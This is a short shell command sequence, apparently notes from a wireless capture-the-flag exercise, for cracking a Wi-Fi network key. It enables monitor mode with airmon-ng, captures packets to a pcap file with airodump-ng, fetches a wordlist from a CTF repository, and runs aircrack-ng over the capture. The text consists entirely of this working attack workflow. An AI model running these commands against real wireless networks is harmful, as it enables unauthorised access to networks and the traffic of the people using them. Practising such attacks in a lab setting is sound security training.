sudo airmon-ng

sudo airmon-ng start wlan27

sudo airodump-ng  -w derp0 --output-format pcap -i wlan27mon
# -i is for saving only IVs (for cracking)


# wget https://raw.githubusercontent.com/rfhs/wctf-files/master/wordlist/cyberpunk.words
sudo aircrack-ng -w cyberpunk.words derp0-01.cap

